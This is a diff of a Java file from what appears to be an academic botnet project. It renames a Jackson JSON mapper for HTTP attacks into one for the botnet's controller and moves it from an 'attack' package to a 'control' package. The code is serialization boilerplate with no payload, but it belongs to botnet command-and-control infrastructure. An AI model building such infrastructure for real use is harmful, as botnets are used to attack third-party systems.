@@ -24,34 +24,34 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.attack.serial;
+package com.acmutv.botnet.core.control.serial;
 
-import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.control.Controller;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.SerializationFeature;
 import com.fasterxml.jackson.databind.module.SimpleModule;
 import lombok.EqualsAndHashCode;
 
 /**
- * The JSON constructor for {@link HttpAttack}.
+ * The JSON constructor for {@link Controller}.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see HttpAttack
- * @see HttpAttackSerializer
- * @see HttpAttackDeserializer
+ * @see Controller
+ * @see ControllerSerializer
+ * @see ControllerDeserializer
  */
 @EqualsAndHashCode(callSuper = true)
-public class HttpAttackJsonMapper extends ObjectMapper {
+public class ControllerJsonMapper extends ObjectMapper {
 
   /**
    * Initializes the JSON constructor.
    */
-  public HttpAttackJsonMapper() {
+  public ControllerJsonMapper() {
     super();
     SimpleModule module = new SimpleModule();
-    module.addSerializer(HttpAttack.class, HttpAttackSerializer.getInstance());
-    module.addDeserializer(HttpAttack.class, HttpAttackDeserializer.getInstance());
+    module.addSerializer(Controller.class, ControllerSerializer.getInstance());
+    module.addDeserializer(Controller.class, ControllerDeserializer.getInstance());
     super.registerModule(module);
     super.enable(SerializationFeature.INDENT_OUTPUT);
   }
